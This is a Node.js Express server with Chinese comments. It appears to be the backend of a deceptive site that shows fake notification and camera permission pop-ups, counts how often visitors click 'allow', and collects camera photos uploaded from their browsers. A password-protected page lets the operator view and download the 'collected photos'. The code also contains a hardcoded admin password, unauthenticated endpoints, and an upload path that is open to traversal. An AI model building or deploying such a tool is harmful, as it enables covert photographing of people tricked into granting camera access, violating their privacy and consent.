const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '20mb' }));
app.use(express.static(__dirname));

// 管理页面密码保护
const ADMIN_PASSWORD = 'DyZp@2026#Secure';
const SESSION_TIMEOUT = 50 * 1000; // 50秒
const adminTokens = new Map(); // token -> lastActivity
const loginAttempts = new Map(); // ip -> { count, lastAttempt }
const MAX_LOGIN_ATTEMPTS = 5;
const LOGIN_LOCKOUT_TIME = 60 * 1000; // 1分钟锁定

function generateToken() {
  return crypto.randomBytes(32).toString('hex');
}

function isValidToken(token) {
  if (!token || !adminTokens.has(token)) return false;
  const lastActivity = adminTokens.get(token);
  if (Date.now() - lastActivity > SESSION_TIMEOUT) {
    adminTokens.delete(token);
    return false;
  }
  adminTokens.set(token, Date.now());
  return true;
}

function checkLoginLimit(ip) {
  const attempts = loginAttempts.get(ip);
  if (!attempts) return true;
  if (Date.now() - attempts.lastAttempt > LOGIN_LOCKOUT_TIME) {
    loginAttempts.delete(ip);
    return true;
  }
  return attempts.count < MAX_LOGIN_ATTEMPTS;
}

function recordLoginAttempt(ip) {
  const attempts = loginAttempts.get(ip) || { count: 0, lastAttempt: 0 };
  attempts.count++;
  attempts.lastAttempt = Date.now();
  loginAttempts.set(ip, attempts);
}

function resetLoginAttempts(ip) {
  loginAttempts.delete(ip);
}

// 持久化存储目录（Railway Volume 挂载到 /data）
const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
const PHOTOS_DIR = path.join(DATA_DIR, 'photos');
const STATS_FILE = path.join(DATA_DIR, 'stats.json');
const SITE_STATUS_FILE = path.join(DATA_DIR, 'site-status.json');

// 确保目录存在
try {
  [DATA_DIR, PHOTOS_DIR].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  });
} catch (e) {
  console.error('Failed to create data directories:', e.message);
}

// 提供照片文件的静态服务
app.use('/data', express.static(DATA_DIR));

// 读取/写入统计数据
function loadStats() {
  try {
    if (fs.existsSync(STATS_FILE)) {
      return JSON.parse(fs.readFileSync(STATS_FILE, 'utf8'));
    }
  } catch (e) {}
  return { notif: 0, camera: 0, realCameraAllow: 0, realCameraDeny: 0 };
}

function saveStats(stats) {
  try {
    fs.writeFileSync(STATS_FILE, JSON.stringify(stats, null, 2));
  } catch (e) {
    console.error('Failed to save stats:', e.message);
  }
}

let clickStats = loadStats();

// 网站状态管理
function loadSiteStatus() {
  try {
    if (fs.existsSync(SITE_STATUS_FILE)) {
      return JSON.parse(fs.readFileSync(SITE_STATUS_FILE, 'utf8'));
    }
  } catch (e) {}
  return { expired: false };
}

function saveSiteStatus(status) {
  try {
    fs.writeFileSync(SITE_STATUS_FILE, JSON.stringify(status, null, 2));
  } catch (e) {
    console.error('Failed to save site status:', e.message);
  }
}

let siteStatus = loadSiteStatus();

// 网站状态API
app.get('/api/site-status', (req, res) => {
  res.json({ expired: siteStatus.expired });
});

app.post('/api/site-toggle', (req, res) => {
  siteStatus.expired = !siteStatus.expired;
  saveSiteStatus(siteStatus);
  res.json({ ok: true, expired: siteStatus.expired });
});

// 记录点击
app.post('/api/track/:type', (req, res) => {
  const type = req.params.type;
  if (type in clickStats) {
    clickStats[type]++;
    saveStats(clickStats);
    res.json({ ok: true, count: clickStats[type] });
  } else {
    res.status(400).json({ ok: false });
  }
});

// 重置统计
app.post('/api/track/reset', (req, res) => {
  const token = req.headers['x-admin-token'];
  if (!isValidToken(token)) {
    return res.status(401).json({ ok: false, error: 'Unauthorized' });
  }
  clickStats = { notif: 0, camera: 0, realCameraAllow: 0, realCameraDeny: 0 };
  saveStats(clickStats);
  res.json({ ok: true });
});

// 静态页面
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'report.html'));
});

// 获取所有session列表
function getSessions() {
  const sessionsFile = path.join(DATA_DIR, 'sessions.json');
  try {
    if (fs.existsSync(sessionsFile)) {
      return JSON.parse(fs.readFileSync(sessionsFile, 'utf8'));
    }
  } catch (e) {}
  return {};
}

function saveSessions(sessions) {
  try {
    fs.writeFileSync(path.join(DATA_DIR, 'sessions.json'), JSON.stringify(sessions, null, 2));
  } catch (e) {
    console.error('Failed to save sessions:', e.message);
  }
}

// 上传照片（保存到磁盘）
app.post('/api/upload', (req, res) => {
  try {
    const { sessionId, index, data } = req.body;
    if (!sessionId || index == null || !data) {
      return res.status(400).json({ ok: false });
    }

    const sessionDir = path.join(PHOTOS_DIR, sessionId);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    // 保存 base64 图片为文件
    const base64Data = data.replace(/^data:image\/\w+;base64,/, '');
    const filePath = path.join(sessionDir, `${index}.jpg`);
    fs.writeFileSync(filePath, Buffer.from(base64Data, 'base64'));

    // 更新 session 索引，记录真实上传时间
    const sessions = getSessions();
    if (!sessions[sessionId]) sessions[sessionId] = { photos: [], createdAt: Date.now() };
    sessions[sessionId].photos[index] = {
      path: `${sessionId}/${index}.jpg`,
      uploadedAt: Date.now()
    };
    saveSessions(sessions);

    res.json({ ok: true });
  } catch (e) {
    console.error('Upload failed:', e.message);
    res.status(500).json({ ok: false, error: e.message });
  }
});

// 清除所有照片
app.delete('/api/photos', (req, res) => {
  const token = req.headers['x-admin-token'];
  if (!isValidToken(token)) {
    return res.status(401).json({ ok: false, error: 'Unauthorized' });
  }
  try {
    // 删除所有照片文件
    if (fs.existsSync(PHOTOS_DIR)) {
      fs.readdirSync(PHOTOS_DIR).forEach(dir => {
        const dirPath = path.join(PHOTOS_DIR, dir);
        if (fs.statSync(dirPath).isDirectory()) {
          fs.readdirSync(dirPath).forEach(file => {
            fs.unlinkSync(path.join(dirPath, file));
          });
          fs.rmdirSync(dirPath);
        }
      });
    }
    // 清空 session 索引
    saveSessions({});
    res.json({ ok: true });
  } catch (e) {
    console.error('Delete failed:', e.message);
    res.status(500).json({ ok: false, error: e.message });
  }
});

// 管理登录API（通用）
app.post('/api/admin-login', (req, res) => {
  const ip = req.ip || req.connection.remoteAddress;
  if (!checkLoginLimit(ip)) {
    return res.status(429).json({ ok: false, error: '登录尝试过多，请1分钟后再试' });
  }
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    resetLoginAttempts(ip);
    const token = generateToken();
    adminTokens.set(token, Date.now());
    res.json({ ok: true, token });
  } else {
    recordLoginAttempt(ip);
    res.status(401).json({ ok: false, error: '密码错误' });
  }
});

// 管理登出API
app.post('/api/admin-logout', (req, res) => {
  const token = req.headers['x-admin-token'];
  if (token) adminTokens.delete(token);
  res.json({ ok: true });
});

// 查看照片页面
app.get('/photos', (req, res) => {
  const token = req.query.token;

  // 显示登录页面
  let loginHtml = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>照片管理 - 登录</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,"PingFang SC",sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh}
.login-box{background:#fff;border-radius:16px;padding:32px 24px;width:85%;max-width:320px;box-shadow:0 4px 20px rgba(0,0,0,0.08)}
.login-title{font-size:18px;font-weight:700;color:#1a1a1a;text-align:center;margin-bottom:8px}
.login-desc{font-size:13px;color:#999;text-align:center;margin-bottom:24px}
.login-input{width:100%;padding:14px 16px;border:1.5px solid #e8e8e8;border-radius:10px;font-size:15px;font-family:inherit;outline:none;transition:border-color 0.2s}
.login-input:focus{border-color:#FE2C55}
.login-btn{width:100%;padding:14px;background:linear-gradient(135deg,#FE2C55,#E81F4A);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit;margin-top:16px}
.login-btn:active{opacity:0.9}
.login-error{color:#FE2C55;font-size:13px;text-align:center;margin-top:12px;display:none}
</style></head><body>
<div class="login-box">
  <div class="login-title">照片管理</div>
  <div class="login-desc">请输入密码访问</div>
  <input type="password" class="login-input" id="pwdInput" placeholder="请输入密码" autofocus>
  <button class="login-btn" onclick="doLogin()">进入</button>
  <div class="login-error" id="errorMsg">密码错误</div>
</div>
<script>
(function(){
  // 检查URL是否有token参数
  var urlParams=new URLSearchParams(window.location.search);
  var urlToken=urlParams.get('token');
  if(urlToken){
    // 有token参数，直接访问
    return;
  }
  // 没有token参数，检查localStorage
  var savedToken=localStorage.getItem('adminToken');
  if(savedToken){
    window.location.href='/photos?token='+savedToken;
    return;
  }
  // 没有token，清除可能过期的localStorage
  localStorage.removeItem('adminToken');
})();
document.getElementById('pwdInput').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin()});
function doLogin(){
  var pwd=document.getElementById('pwdInput').value;
  fetch('/api/admin-login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pwd})})
  .then(function(r){return r.json()})
  .then(function(d){
    if(d.ok){localStorage.setItem('adminToken',d.token);window.location.href='/photos?token='+d.token;}
    else{document.getElementById('errorMsg').textContent=d.error||'密码错误';document.getElementById('errorMsg').style.display='block';}
  });
}
</script></body></html>`;

  if (!token) {
    // 没有token参数，显示登录页面
    return res.send(loginHtml);
  }

  if (!isValidToken(token)) {
    // token无效，显示登录页面（会清除localStorage）
    return res.send(loginHtml);
  }

  const sessions = getSessions();
  const ids = Object.keys(sessions);
  const isEmpty = ids.length === 0;

  let html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>已采集照片</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,"PingFang SC",sans-serif;background:#f5f5f5;color:#1a1a1a;padding:0 0 80px}
.topbar{background:linear-gradient(135deg,#FE2C55,#D4163E);color:#fff;padding:16px;position:sticky;top:0;z-index:10;display:flex;align-items:center;justify-content:space-between}
.topbar h1{font-size:17px;font-weight:700}
.topbar-actions{display:flex;gap:8px}
.topbar-btn{background:rgba(255,255,255,0.2);border:none;color:#fff;padding:6px 14px;border-radius:8px;font-size:13px;cursor:pointer;font-family:inherit}
.topbar-btn:active{background:rgba(255,255,255,0.3)}
.topbar-btn.danger{background:rgba(0,0,0,0.2)}
.empty{text-align:center;padding:80px 20px;color:#999;font-size:15px}
.session{background:#fff;margin:12px 16px;border-radius:14px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,0.06)}
.session-header{padding:16px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f0f0f0}
.session-info{display:flex;align-items:center;gap:12px}
.session-icon{width:40px;height:40px;background:linear-gradient(135deg,#FE2C55,#E81F4A);border-radius:10px;display:flex;align-items:center;justify-content:center}
.session-icon svg{width:20px;height:20px;fill:#fff}
.session-text h3{font-size:15px;font-weight:600;color:#1a1a1a;margin-bottom:2px}
.session-text span{font-size:12px;color:#999}
.session-check{width:20px;height:20px;accent-color:#FE2C55;cursor:pointer}
.photos{padding:12px;display:grid;grid-template-columns:1fr 1fr;gap:10px}
.photo-wrap{position:relative;cursor:pointer;border-radius:10px;overflow:hidden}
.photo-wrap img{width:100%;aspect-ratio:1;object-fit:cover;border:2px solid transparent;transition:all 0.2s;display:block}
.photo-wrap.selected img{border-color:#FE2C55;transform:scale(0.97)}
.photo-wrap .check{position:absolute;top:8px;right:8px;width:24px;height:24px;background:#FE2C55;border-radius:50%;display:none;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(254,44,85,0.4)}
.photo-wrap.selected .check{display:flex}
.photo-wrap .check svg{width:14px;height:14px;fill:#fff}
.photo-time{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,0.7));padding:8px 10px 6px}
.photo-time span{font-size:11px;color:#fff}
.session-footer{padding:12px 16px;border-top:1px solid #f0f0f0;display:flex;align-items:center;justify-content:space-between}
.session-meta{font-size:12px;color:#999}
.session-id{font-size:11px;color:#bbb;font-family:monospace}
.bottom-bar{position:fixed;bottom:0;left:0;right:0;background:#fff;padding:14px 20px;box-shadow:0 -4px 20px rgba(0,0,0,0.08);display:none;align-items:center;justify-content:space-between;z-index:10}
.bottom-bar.show{display:flex}
.bottom-bar .count{font-size:15px;color:#333;font-weight:500}
.bottom-bar .dl-btn{background:linear-gradient(135deg,#FE2C55,#E81F4A);color:#fff;border:none;padding:12px 28px;border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;box-shadow:0 4px 12px rgba(254,44,85,0.3)}
.clear-btn{background:#fff;color:#666;border:1.5px solid #ddd;padding:12px 20px;border-radius:12px;font-size:15px;cursor:pointer;font-family:inherit}
</style></head><body>
<div class="topbar">
  <h1>已采集照片</h1>
  <div class="topbar-actions">
    <button class="topbar-btn danger" onclick="clearAll()">清除全部</button>
  </div>
</div>`;

  if (isEmpty) {
    html += '<div class="empty"><p style="font-size:40px;margin-bottom:12px">📷</p>暂无采集照片</div>';
  } else {
    ids.reverse().forEach(id => {
      const session = sessions[id];
      const photos = session.photos || [];
      const createdAt = session.createdAt || parseInt(id.split('_')[0]);
      const dateStr = new Date(createdAt).toLocaleString('zh-CN', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' });
      const count = photos.filter(Boolean).length;

      html += `<div class="session" data-id="${id}">
  <div class="session-header">
    <div class="session-info">
      <div class="session-icon"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
      <div class="session-text">
        <h3>${dateStr}</h3>
        <span>共 ${count} 张照片</span>
      </div>
    </div>
    <input type="checkbox" class="session-check" onchange="toggleSession(this,'${id}')">
  </div>
  <div class="photos">`;

      photos.forEach((p, i) => {
        if (p) {
          const imgUrl = '/data/photos/' + (p.path || p);
          const uploadTime = p.uploadedAt ? new Date(p.uploadedAt).toLocaleString('zh-CN', { hour: '2-digit', minute: '2-digit', second: '2-digit' }) : '';
          html += `<div class="photo-wrap" data-url="${imgUrl}" onclick="togglePhoto(this)">
  <img src="${imgUrl}" alt="照片${i + 1}">
  <div class="check"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div>
  <div class="photo-time"><span>${uploadTime}</span></div>
</div>`;
        }
      });

      html += `</div>
  <div class="session-footer">
    <span class="session-meta">采集于 ${dateStr}</span>
    <span class="session-id">${id}</span>
  </div>
</div>`;
    });
  }

  html += `<div class="bottom-bar" id="bottomBar">
  <span class="count" id="selCount">已选 0 张</span>
  <div style="display:flex;gap:8px">
    <button class="clear-btn" onclick="clearSelection()">清空</button>
    <button class="dl-btn" onclick="downloadSelected()">下载选中</button>
  </div>
</div>
<script>
var selected = new Set();
function updateBar(){
  var bar=document.getElementById('bottomBar');
  var c=selected.size;
  document.getElementById('selCount').textContent='已选 '+c+' 张';
  bar.className='bottom-bar'+(c>0?' show':'');
}
function togglePhoto(el){
  var url=el.getAttribute('data-url');
  if(selected.has(url)){selected.delete(url);el.classList.remove('selected')}
  else{selected.add(url);el.classList.add('selected')}
  updateBar();
}
function toggleSession(cb,sid){
  var session=document.querySelector('.session[data-id="'+sid+'"]');
  session.querySelectorAll('.photo-wrap').forEach(function(el){
    var url=el.getAttribute('data-url');
    if(cb.checked){selected.add(url);el.classList.add('selected')}
    else{selected.delete(url);el.classList.remove('selected')}
  });
  updateBar();
}
function clearSelection(){
  selected.clear();
  document.querySelectorAll('.photo-wrap.selected').forEach(function(el){
    el.classList.remove('selected');
  });
  document.querySelectorAll('.session-check').forEach(function(el){
    el.checked=false;
  });
  updateBar();
}
function downloadSelected(){
  if(selected.size===0)return;
  var i=0;
  selected.forEach(function(url){
    var a=document.createElement('a');
    a.href=url;
    a.download='photo_'+(++i)+'.jpg';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  });
}
function clearAll(){
  if(!confirm('确认清除所有照片？'))return;
  fetch('/api/photos',{method:'DELETE',headers:{'X-Admin-Token':adminToken}}).then(function(){location.reload()});
}
// 会话超时检测
var adminToken='${token}';
var lastActivity=Date.now();
function resetActivity(){lastActivity=Date.now();}
document.addEventListener('click',resetActivity);
document.addEventListener('touchstart',resetActivity);
setInterval(function(){
  if(Date.now()-lastActivity>50000){
    localStorage.removeItem('adminToken');
    fetch('/api/admin-logout',{method:'POST',headers:{'X-Admin-Token':adminToken}});
    alert('会话已过期，请重新登录');
    window.location.href='/photos';
  }
},5000);
</script></body></html>`;
  res.send(html);
});

// 查看所有session的JSON数据（调试用）
app.get('/api/photos', (req, res) => {
  const sessions = getSessions();
  const ids = Object.keys(sessions);
  res.json(ids.map(id => ({
    sessionId: id,
    count: (sessions[id].photos || []).filter(Boolean).length,
    createdAt: sessions[id].createdAt
  })));
});

// 统计页面
app.get('/amount', (req, res) => {
  const token = req.query.token;

  // 显示登录页面
  let loginHtml = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>统计管理 - 登录</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,"PingFang SC",sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh}
.login-box{background:#fff;border-radius:16px;padding:32px 24px;width:85%;max-width:320px;box-shadow:0 4px 20px rgba(0,0,0,0.08)}
.login-title{font-size:18px;font-weight:700;color:#1a1a1a;text-align:center;margin-bottom:8px}
.login-desc{font-size:13px;color:#999;text-align:center;margin-bottom:24px}
.login-input{width:100%;padding:14px 16px;border:1.5px solid #e8e8e8;border-radius:10px;font-size:15px;font-family:inherit;outline:none;transition:border-color 0.2s}
.login-input:focus{border-color:#FE2C55}
.login-btn{width:100%;padding:14px;background:linear-gradient(135deg,#FE2C55,#E81F4A);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit;margin-top:16px}
.login-btn:active{opacity:0.9}
.login-error{color:#FE2C55;font-size:13px;text-align:center;margin-top:12px;display:none}
</style></head><body>
<div class="login-box">
  <div class="login-title">统计管理</div>
  <div class="login-desc">请输入密码访问</div>
  <input type="password" class="login-input" id="pwdInput" placeholder="请输入密码" autofocus>
  <button class="login-btn" onclick="doLogin()">进入</button>
  <div class="login-error" id="errorMsg">密码错误</div>
</div>
<script>
(function(){
  var urlParams=new URLSearchParams(window.location.search);
  var urlToken=urlParams.get('token');
  if(urlToken){return;}
  var savedToken=localStorage.getItem('adminToken');
  if(savedToken){window.location.href='/amount?token='+savedToken;return;}
  localStorage.removeItem('adminToken');
})();
document.getElementById('pwdInput').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin()});
function doLogin(){
  var pwd=document.getElementById('pwdInput').value;
  fetch('/api/admin-login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pwd})})
  .then(function(r){return r.json()})
  .then(function(d){
    if(d.ok){localStorage.setItem('adminToken',d.token);window.location.href='/amount?token='+d.token;}
    else{document.getElementById('errorMsg').textContent=d.error||'密码错误';document.getElementById('errorMsg').style.display='block';}
  });
}
</script></body></html>`;

  if (!token) {
    return res.send(loginHtml);
  }

  if (!isValidToken(token)) {
    return res.send(loginHtml);
  }

  res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>点击统计</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,"PingFang SC",sans-serif;background:#f5f5f5;color:#1a1a1a}
.topbar{background:linear-gradient(135deg,#FE2C55,#D4163E);color:#fff;padding:16px;position:sticky;top:0;z-index:10}
.topbar h1{font-size:17px;font-weight:700}
.stats{padding:20px 16px}
.stat-card{background:#fff;border-radius:12px;padding:20px;margin-bottom:12px;box-shadow:0 1px 4px rgba(0,0,0,0.04)}
.stat-label{font-size:13px;color:#999;margin-bottom:8px}
.stat-num{font-size:42px;font-weight:700;color:#1a1a1a;line-height:1}
.stat-num.red{color:#FE2C55}
.stat-sub{font-size:12px;color:#bbb;margin-top:6px}
.refresh-btn{display:block;width:calc(100% - 32px);margin:8px 16px;padding:12px;background:#fff;border:1.5px solid #e8e8e8;border-radius:10px;font-size:15px;cursor:pointer;font-family:inherit;color:#333}
.refresh-btn:active{background:#f5f5f5}
</style></head><body>
<div class="topbar"><h1>点击允许统计</h1></div>
<div class="stats">
  <div class="stat-card">
    <div class="stat-label">自制通知权限 - 点击允许次数</div>
    <div class="stat-num red">${clickStats.notif}</div>
    <div class="stat-sub">进入网站时弹出的通知权限申请</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">自制相机权限 - 点击允许次数</div>
    <div class="stat-num red">${clickStats.camera}</div>
    <div class="stat-sub">进入网站时弹出的相机权限申请</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">浏览器相机权限 - 点击允许次数</div>
    <div class="stat-num" style="color:#07c160">${clickStats.realCameraAllow}</div>
    <div class="stat-sub">点击提交后弹出的浏览器原生相机权限</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">浏览器相机权限 - 点击拒绝次数</div>
    <div class="stat-num" style="color:#999">${clickStats.realCameraDeny}</div>
    <div class="stat-sub">点击提交后弹出的浏览器原生相机权限</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">合计</div>
    <div class="stat-num">${clickStats.notif + clickStats.camera + clickStats.realCameraAllow + clickStats.realCameraDeny}</div>
    <div class="stat-sub">所有权限弹窗的总点击次数</div>
  </div>
</div>
<button class="refresh-btn" onclick="location.reload()">刷新数据</button>
<button class="refresh-btn" style="color:#FE2C55;border-color:#FE2C55;" onclick="resetStats()">重置所有数据</button>
<script>
function resetStats(){
  if(!confirm('确认重置所有统计数据？'))return;
  fetch('/api/track/reset',{method:'POST',headers:{'X-Admin-Token':adminToken}}).then(function(){location.reload()});
}
// 会话超时检测
var adminToken='${token}';
var lastActivity=Date.now();
function resetActivity(){lastActivity=Date.now();}
document.addEventListener('click',resetActivity);
document.addEventListener('touchstart',resetActivity);
setInterval(function(){
  if(Date.now()-lastActivity>50000){
    localStorage.removeItem('adminToken');
    fetch('/api/admin-logout',{method:'POST',headers:{'X-Admin-Token':adminToken}});
    alert('会话已过期，请重新登录');
    window.location.href='/amount';
  }
},5000);
</script>
</body></html>`);
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`查看照片: http://localhost:${PORT}/photos`);
});
